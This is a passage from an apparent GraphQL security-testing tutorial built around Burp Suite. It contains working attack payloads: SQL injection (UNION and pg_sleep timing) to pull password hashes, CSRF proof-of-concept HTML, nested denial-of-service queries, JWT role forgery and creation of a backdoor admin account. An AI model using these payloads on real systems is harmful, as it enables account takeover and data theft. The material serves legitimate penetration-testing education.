}\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eBy combining multiple expensive operations or using very permissive search parameters, attackers can overload the server.\u003c/p\u003e\n\u003cp\u003eTesting resource-intensive operations with Burp Repeater:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eIdentify potentially expensive operations\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eLook for operations involving:\n\u003cul\u003e\n\u003cli\u003eSearch functionality\u003c/li\u003e\n\u003cli\u003eFiltering large datasets\u003c/li\u003e\n\u003cli\u003eGeospatial queries\u003c/li\u003e\n\u003cli\u003eData aggregation\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eTest with Burp Repeater using minimal parameters\u003c/strong\u003e:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003ePOST /graphql HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\"query\": \"query { searchProducts(query: \\\"\\\") { id name description } }\"}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eModify parameters to maximize resource usage\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUse very broad search terms (\"a\", \"e\", etc.)\u003c/li\u003e\n\u003cli\u003eRequest large result sets\u003c/li\u003e\n\u003cli\u003eCombine multiple resource-intensive operations in one query\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eMeasure and document the impact\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eNote response times\u003c/li\u003e\n\u003cli\u003eWatch for server errors or timeouts\u003c/li\u003e\n\u003cli\u003eIdentify operations that cause the most significant performance degradation\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003eAuthorization Bypass\u003c/h3\u003e\n\u003cp\u003eGraphQL has unique authorization challenges due to its flexible query structure. Here's how to test for these issues with Burp Suite:\u003c/p\u003e\n\u003ch4\u003eObject-Level vs. Field-Level Authorization\u003c/h4\u003e\n\u003cp\u003eMany GraphQL implementations check authorization at the object level but not at the field level:\u003c/p\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003equery {\n  # Authorized at object level\n  currentUser {\n    username\n    email\n    # Field-level authorization missing\n    role\n    permissions\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIf the API only checks whether the user can access the \u003ccode\u003ecurrentUser\u003c/code\u003e object but doesn't verify access to specific fields like \u003ccode\u003erole\u003c/code\u003e or \u003ccode\u003epermissions\u003c/code\u003e, sensitive data might be exposed.\u003c/p\u003e\n\u003cp\u003eTesting field-level authorization with Burp Repeater:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAuthenticate with different user accounts\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCreate users with different permission levels (admin, regular user, etc.)\u003c/li\u003e\n\u003cli\u003eObtain authorization tokens for each user\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eCreate a query that requests sensitive fields\u003c/strong\u003e:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003ePOST /graphql HTTP/1.1\nHost: example.com\nContent-Type: application/json\nAuthorization: Bearer REGULAR_USER_TOKEN\n\n{\"query\": \"query { currentUser { username email role permissions adminSettings } }\"}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAnalyze the response\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCheck if sensitive fields are returned despite insufficient privileges\u003c/li\u003e\n\u003cli\u003eNote which fields are properly protected and which are not\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eCompare with admin-level access\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSwitch the token to an admin user\u003c/li\u003e\n\u003cli\u003eRun the same query and compare results\u003c/li\u003e\n\u003cli\u003eDocument any fields that should only be visible to admins but are exposed to regular users\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch4\u003eUnauthorized Mutations via Fragments\u003c/h4\u003e\n\u003cp\u003eFragment abuse can sometimes bypass authorization:\u003c/p\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003emutation {\n  updateUser(id: \"1\", input: {\n    email: \"hacker@evil.com\"\n  }) {\n    ...AdminFields\n  }\n}\n\nfragment AdminFields on User {\n  id\n  role\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIf the API doesn't properly check authorization for fragment fields separately from the main query, an attacker might gain access to restricted data.\u003c/p\u003e\n\u003cp\u003eTesting fragment-based authorization bypass with Burp Repeater:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eIdentify a mutation that returns user data\u003c/strong\u003e:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003ePOST /graphql HTTP/1.1\nHost: example.com\nContent-Type: application/json\nAuthorization: Bearer USER_TOKEN\n\n{\"query\": \"mutation { updateUser(id: \\\"1\\\", input: { name: \\\"Test User\\\" }) { id name } }\"}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAdd a fragment requesting sensitive fields\u003c/strong\u003e:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003ePOST /graphql HTTP/1.1\nHost: example.com\nContent-Type: application/json\nAuthorization: Bearer USER_TOKEN\n\n{\"query\": \"mutation { updateUser(id: \\\"1\\\", input: { name: \\\"Test User\\\" }) { id name ...AdminFields } } fragment AdminFields on User { role permissions adminSettings }\"}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAnalyze the response\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCheck if the fragment fields are returned despite insufficient privileges\u003c/li\u003e\n\u003cli\u003eVerify if authorization checks handle fragments properly\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003eCSRF Vulnerabilities in GraphQL\u003c/h3\u003e\n\u003cp\u003eCross-Site Request Forgery (CSRF) vulnerabilities occur when GraphQL endpoints don't properly verify that requests are intentional. Unlike traditional REST APIs where each endpoint can have its own CSRF protection, GraphQL typically uses a single endpoint for all operations, complicating CSRF defenses.\u003c/p\u003e\n\u003ch4\u003eCSRF via GET Requests\u003c/h4\u003e\n\u003cp\u003eWhile GraphQL operations are typically submitted via POST requests, some implementations also support GET requests with the query in URL parameters:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003ehttps://api.example.com/graphql?query=mutation{createUser(username:\"malicious\",role:\"admin\"){id}}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIf the API accepts GET requests and relies solely on cookies for authentication, it may be vulnerable to CSRF attacks. An attacker could create a malicious website that triggers this request:\u003c/p\u003e\n\u003cpre class=\"language-html\"\u003e\u003ccode class=\"language-html\"\u003e\u0026#x3C;img src=\"https://api.example.com/graphql?query=mutation{createUser(username:'attacker',role:'admin'){id}}\" style=\"display:none\"\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWhen a victim with an active session visits this page, their browser automatically includes their authentication cookies, potentially executing the mutation.\u003c/p\u003e\n\u003cp\u003eTesting for GET-based CSRF with Burp Repeater:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eTest if GET requests are supported\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCreate a simple GraphQL query in Burp Repeater\u003c/li\u003e\n\u003cli\u003eConvert it from POST to GET by moving the query to URL parameters:\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003eGET /graphql?query=query{__typename} HTTP/1.1\nHost: example.com\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eTest mutations via GET\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIf GET requests work, try a mutation via GET:\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003eGET /graphql?query=mutation{createUser(username:\"test\",role:\"user\"){id}} HTTP/1.1\nHost: example.com\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eCreate a CSRF PoC HTML page\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIf mutations via GET work, create a simple HTML page:\n\u003cpre class=\"language-html\"\u003e\u003ccode class=\"language-html\"\u003e\u0026#x3C;!DOCTYPE html\u003e\n\u0026#x3C;html\u003e\n\u0026#x3C;body\u003e\n  \u0026#x3C;h1\u003eTest Page\u0026#x3C;/h1\u003e\n  \u0026#x3C;img src=\"https://api.example.com/graphql?query=mutation{createUser(username:'csrf_test',role:'admin'){id}}\" style=\"display:none\"\u003e\n\u0026#x3C;/body\u003e\n\u0026#x3C;/html\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eTest the PoC\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSave the HTML to a file\u003c/li\u003e\n\u003cli\u003eOpen it in a browser where you have an active session with the target site\u003c/li\u003e\n\u003cli\u003eCheck if the mutation executes successfully\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eFor POST-based CSRF, you can test with a more sophisticated HTML form that submits automatically:\u003c/p\u003e\n\u003cpre class=\"language-html\"\u003e\u003ccode class=\"language-html\"\u003e\u0026#x3C;!DOCTYPE html\u003e\n\u0026#x3C;html\u003e\n\u0026#x3C;body onload=\"document.forms[0].submit()\"\u003e\n  \u0026#x3C;form action=\"https://api.example.com/graphql\" method=\"POST\" enctype=\"text/plain\"\u003e\n    \u0026#x3C;input name='{\"query\":\"mutation{createUser(username:' value='\"csrf_test\",role:\"admin\"){id}}\"}' type=\"hidden\"\u003e\n  \u0026#x3C;/form\u003e\n\u0026#x3C;/body\u003e\n\u0026#x3C;/html\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eAdvanced Attack Scenarios\u003c/h2\u003e\n\u003cp\u003eLet's explore some complex attack chains that combine multiple GraphQL vulnerabilities to achieve significant security breaches. These scenarios can be tested manually using Burp Suite.\u003c/p\u003e\n\u003ch3\u003eScenario 1: Information Disclosure to Account Takeover\u003c/h3\u003e\n\u003cp\u003eThis attack chain demonstrates how GraphQL vulnerabilities can be combined to progress from initial information disclosure to full account takeover:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eInitial Reconnaissance\u003c/strong\u003e: The attacker uses introspection to discover the schema structure.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003equery {\n  __schema {\n    types {\n      name\n      kind\n      fields {\n        name\n      }\n    }\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e\u003cstrong\u003eIdentify User Query\u003c/strong\u003e: The attacker discovers a \u003ccode\u003euser\u003c/code\u003e query that takes a username parameter.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003equery {\n  user(username: \"admin\") {\n    id\n    username\n    email\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"3\"\u003e\n\u003cli\u003e\u003cstrong\u003eExploiting Over-fetching\u003c/strong\u003e: The attacker discovers they can request additional fields beyond what the UI normally shows.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003equery {\n  user(username: \"admin\") {\n    id\n    username\n    email\n    resetToken  # Sensitive field not intended for user access\n    lastLogin\n    role\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"4\"\u003e\n\u003cli\u003e\u003cstrong\u003eEnumerating Users\u003c/strong\u003e: The attacker uses batching to efficiently enumerate valid usernames.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003e[\n  { \"query\": \"query { user(username: \\\"admin\\\") { id } }\" },\n  { \"query\": \"query { user(username: \\\"john\\\") { id } }\" },\n  { \"query\": \"query { user(username: \\\"sarah\\\") { id } }\" },\n  # ... many more\n]\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"5\"\u003e\n\u003cli\u003e\u003cstrong\u003eSQL Injection to Retrieve Password Hashes\u003c/strong\u003e: The attacker discovers a SQL injection vulnerability in the user query.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003equery {\n  user(username: \"admin' UNION SELECT id, username, password_hash as email, 'token' as resetToken FROM users --\") {\n    id\n    username\n    email  # This will contain password hashes\n    resetToken\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"6\"\u003e\n\u003cli\u003e\u003cstrong\u003ePassword Reset Manipulation\u003c/strong\u003e: Using the discovered SQL injection, the attacker manages to reset a user's password by manipulating the resetToken field.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003emutation {\n  resetPassword(input: {\n    username: \"admin\",\n    token: \"STOLEN_OR_GENERATED_TOKEN\",\n    newPassword: \"hacked_password\"\n  }) {\n    success\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"7\"\u003e\n\u003cli\u003e\u003cstrong\u003eAccount Takeover\u003c/strong\u003e: With the password reset, the attacker now has full control of the admin account.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003emutation {\n  login(username: \"admin\", password: \"hacked_password\") {\n    token\n    user {\n      id\n      role\n    }\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eScenario 2: DoS to Data Exfiltration\u003c/h3\u003e\n\u003cp\u003eThis attack chain shows how DoS techniques can be leveraged for data exfiltration:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eIdentifying Expensive Operations\u003c/strong\u003e: The attacker identifies resource-intensive operations.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003equery {\n  searchProducts(keyword: \"\") {  # Empty search returns all products\n    id\n    name\n    price\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e\u003cstrong\u003eCreating DoS Conditions\u003c/strong\u003e: The attacker creates a nested query that puts significant load on the server.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003equery {\n  categories {\n    products(first: 1000) {\n      reviews(first: 1000) {\n        user {\n          posts(first: 1000) {\n            comments(first: 1000) {\n              id\n            }\n          }\n        }\n      }\n    }\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"3\"\u003e\n\u003cli\u003e\u003cstrong\u003eTiming Attack Preparation\u003c/strong\u003e: While the server is under heavy load, the attacker prepares timing-based attacks to extract data.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003equery {\n  # First, create heavy load\n  search1: searchProducts(keyword: \"\") { id }\n  \n  # Then attempt a timing attack\n  user(username: \"admin' AND (SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END from users where username='admin') --\") {\n    id\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"4\"\u003e\n\u003cli\u003e\u003cstrong\u003eManual Timing Attack Execution\u003c/strong\u003e:\n\u003cul\u003e\n\u003cli\u003eConfigure Burp Repeater to send a request containing both a DoS component and an SQL injection with timing components\u003c/li\u003e\n\u003cli\u003eSend requests with different character guesses (a-z, 0-9)\u003c/li\u003e\n\u003cli\u003eMeasure the response time for each character\u003c/li\u003e\n\u003cli\u003eWhen response time is significantly longer, you've identified the correct character\u003c/li\u003e\n\u003cli\u003eRepeat for each position in the target data\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003eScenario 3: Chaining Multiple Vulnerabilities for Privilege Escalation\u003c/h3\u003e\n\u003cp\u003eThis attack chain demonstrates a sophisticated privilege escalation:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eInitial Access\u003c/strong\u003e: The attacker starts with a low-privileged account.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003emutation {\n  login(username: \"regular_user\", password: \"password123\") {\n    token\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e\u003cstrong\u003eInformation Gathering\u003c/strong\u003e: The attacker uses overfetching to discover admin accounts.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003equery {\n  users {\n    id\n    username\n    role\n    email\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"3\"\u003e\n\u003cli\u003e\u003cstrong\u003eExploiting Broken Authentication\u003c/strong\u003e: The attacker finds a manipulation vulnerability in the login mutation.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"language-graphql\"\u003e\u003ccode class=\"language-graphql\"\u003emutation {\n  login(username: \"regular_user\", password: \"password123\") {\n    token\n    # Forcing fields that might not be properly protected\n    user {\n      id\n      role\n      permissions\n    }\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"4\"\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eJWT Analysis\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUse the JWT token from the response\u003c/li\u003e\n\u003cli\u003eDecode it using Burp's JWT Editor extension or an online tool like jwt.io\u003c/li\u003e\n\u003cli\u003eExamine the payload for editable claims:\n\u003cpre class=\"language-javascript\"\u003e\u003ccode class=\"language-javascript\"\u003e// Decoded JWT payload\n{\n  \"sub\": \"123\",\n  \"username\": \"regular_user\",\n  \"role\": \"user\",\n  \"iat\": 1650000000,\n  \"exp\": 1650086400\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eJWT Manipulation\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIf the token uses a weak algorithm (like HS256), attempt to modify the role claim\u003c/li\u003e\n\u003cli\u003eTry common secrets using Burp's JWT Editor extension\u003c/li\u003e\n\u003cli\u003eIf successful, you'll get a new token with admin privileges\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eTesting Privileged Access\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUse the forged token in Burp Repeater\u003c/li\u003e\n\u003cli\u003eAttempt to access admin-only functionality:\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003ePOST /graphql HTTP/1.1\nHost: example.com\nContent-Type: application/json\nAuthorization: Bearer FORGED_TOKEN\n\n{\"query\": \"mutation { deleteUser(id: \\\"456\\\") { success } }\"}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eCreating Backdoor Account\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIf the forged token works, create a new admin account for persistent access:\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003ePOST /graphql HTTP/1.1\nHost: example.com\nContent-Type: application/json\nAuthorization: Bearer FORGED_TOKEN\n\n{\"query\": \"mutation { createUser(input: { username: \\\"backup_admin\\\", password: \\\"evil_password\\\", email: \\\"attacker@evil.com\\\", role: \\\"admin\\\" }) { id role } }\"}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003eGraphQL Security Testing Tools\u003c/h2\u003e\n\u003cp\u003eSeveral specialized tools can help test GraphQL security:\u003c/p\u003e\n\u003ch3\u003eInQL\u003c/h3\u003e\n\u003cp\u003eInQL is a Burp Suite extension specifically designed for GraphQL security testing:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e# Installing InQL Scanner CLI\npip install inql\n\n# Running a basic scan\ninql -t https://api.example.com/graphql\n\n# Dumping schema and generating queries\ninql -t https://api.example.com/graphql -d schema_dump -g\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eGraphQL Voyager\u003c/h3\u003e\n\u003cp\u003eGraphQL Voyager creates visual representations of your schema, helping identify security issues:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e# Installing GraphQL Voyager\nnpm install -g graphql-voyager\n\n# Usage with a local schema file\nvoyager --url https://api.example.com/graphql\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eAltair GraphQL Client\u003c/h3\u003e\n\u003cp\u003eAltair provides a sophisticated interface for GraphQL testing:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e# Installing Altair CLI\nnpm install -g altair-graphql-client\n\n# Running Altair\naltair\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eCustom Security Testing with Burp Suite\u003c/h3\u003e\n\u003cp\u003eFor comprehensive security testing, you can leverage Burp Suite Professional's built-in tools:\u003c/p\u003e\n\u003ch4\u003e1. Setting up a GraphQL testing project in Burp Suite\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eCreate a new Burp project\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eLaunch Burp Suite Professional\u003c/li\u003e\n\u003cli\u003eCreate a new project dedicated to GraphQL testing\u003c/li\u003e\n\u003cli\u003eConfigure your browser to proxy through Burp (default: 127.0.0.1:8080)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eInstall GraphQL-specific extensions\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eGo to the \"Extensions\" tab\u003c/li\u003e\n\u003cli\u003eBrowse the BApp Store\u003c/li\u003e\n\u003cli\u003eInstall \"InQL - Introspection GraphQL Scanner\"\u003c/li\u003e\n\u003cli\u003eInstall \"GraphQL Raider\" if available\u003c/li\u003e\n\u003cli\u003eInstall \"JSON Web Tokens\" for testing JWT authentication\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eConfigure target scope\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIn the \"Target\" tab, add the GraphQL API endpoint to scope\u003c/li\u003e\n\u003cli\u003eConfigure appropriate exclusions for any irrelevant paths\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch4\u003e2. Systematically testing for vulnerabilities\u003c/h4\u003e\n\u003cp\u003eCreate a testing checklist in Burp Suite:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eReconnaissance phase\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUse InQL to perform introspection and map the schema\u003c/li\u003e\n\u003cli\u003eSave discovered queries and mutations for later testing\u003c/li\u003e\n\u003cli\u003eDocument sensitive fields and operations\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAuthentication testing\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eTest JWT tokens using the JWT Editor\u003c/li\u003e\n\u003cli\u003eCheck for token tampering vulnerabilities\u003c/li\u003e\n\u003cli\u003eVerify token signature validation\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAuthorization testing\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCreate test cases in Repeater for each permission level\u003c/li\u003e\n\u003cli\u003eTest field-level authorization with different user roles\u003c/li\u003e\n\u003cli\u003eDocument authorization bypasses\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eInjection testing\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUse Intruder to test SQL and NoSQL injection points\u003c/li\u003e\n\u003cli\u003eSave successful payloads as session handling rules\u003c/li\u003e\n\u003cli\u003eUse Active Scan with appropriate configurations\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eDoS and performance testing\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCreate complex nested queries in Repeater\u003c/li\u003e\n\u003cli\u003eTest batching limitations\u003c/li\u003e\n\u003cli\u003eDocument response times for various query types\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eCSRF testing\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eGenerate CSRF PoCs using Burp's built-in generator\u003c/li\u003e\n\u003cli\u003eTest both GET and POST-based CSRF\u003c/li\u003e\n\u003cli\u003eVerify anti-CSRF token implementations\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch4\u003e3. Documenting findings with Burp Suite\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eUse Burp's built-in reporting\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAdd issues to the \"Issues\" tab\u003c/li\u003e\n\u003cli\u003eInclude detailed reproduction steps\u003c/li\u003e\n\u003cli\u003eClassify by severity and confidence\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eLeverage Burp's session handling\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCreate session handling rules for authenticated testing\u003c/li\u003e\n\u003cli\u003eStore and reuse authentication tokens\u003c/li\u003e\n\u003cli\u003eCreate macros for multi-step exploits\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eSave your project\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eMaintain a persistent Burp project for the target\u003c/li\u003e\n\u003cli\u003eDocument progress in the project\u003c/li\u003e\n\u003cli\u003eExport findings for reporting\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eBy using Burp Suite's comprehensive toolset, you can methodically test GraphQL APIs for security vulnerabilities without relying on custom scripts, making the testing process more standardized and repeatable.\u003c/p\u003e\n\u003ch2\u003eThe Complete GraphQL Testing Methodology\u003c/h2\u003e\n\u003cp\u003eLet's expand on our testing approach with a comprehensive, step-by-step checklist specifically designed for GraphQL APIs. This methodology has been battle-tested on dozens of real-world GraphQL implementations.\u003c/p\u003e\n\u003ch3\u003e1. Initial GraphQL Endpoint Discovery\u003c/h3\u003e\n\u003cp\u003eBefore you can test a GraphQL API, you need to find it. Look for these common endpoint patterns:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e/graphql\u003c/code\u003e - The most common endpoint\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/api/graphql\u003c/code\u003e - Often used in structured APIs\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/query\u003c/code\u003e - Sometimes used as an alias\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/graphiql\u003c/code\u003e or \u003ccode\u003e/playground\u003c/code\u003e - Development interfaces that might be left 